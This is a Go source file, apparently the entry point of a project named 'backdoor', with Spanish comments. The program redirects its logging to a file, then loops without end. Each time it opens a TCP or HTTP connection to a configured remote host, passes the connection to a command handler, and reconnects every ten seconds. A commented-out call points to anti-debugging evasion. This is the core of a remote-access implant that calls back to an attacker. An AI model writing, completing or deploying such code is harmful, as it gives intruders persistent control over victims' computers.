package main

import (
	"backdoor/config"
	"backdoor/handler"
	"backdoor/transport"
	"log"
	"os"
	"time"
)

func main() {
	// Crear archivo log.txt o abrir si ya existe
	logFile, err := os.OpenFile("log.txt", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		// Si no se puede abrir el archivo, al menos mostrar el error por consola
		panic(err)
	}
	defer logFile.Close()

	// Redirigir logs a log.txt
	log.SetOutput(logFile)
	log.SetFlags(log.LstdFlags | log.Lshortfile)

	// evasion.StartAntiDebugLoop()
	for {
		var conn transport.Transport
		var err error

		switch config.Mode {
		case "tcp":
			conn = transport.NewTCP(config.Host + ":" + config.Port)
		case "udp":
			//conn = transport.NewUDP(config.Host + ":" +config.Port)
		case "http":
			conn = transport.NewHTTP("http://" + config.Host + ":" + config.Port)
		}

		if conn == nil {
			time.Sleep(10 * time.Second)
			continue
		}
		if err = conn.Connect(); err != nil {
			return
		}

		handler.Handle(conn)
		conn.Close()
		time.Sleep(10 * time.Second)
	}
}
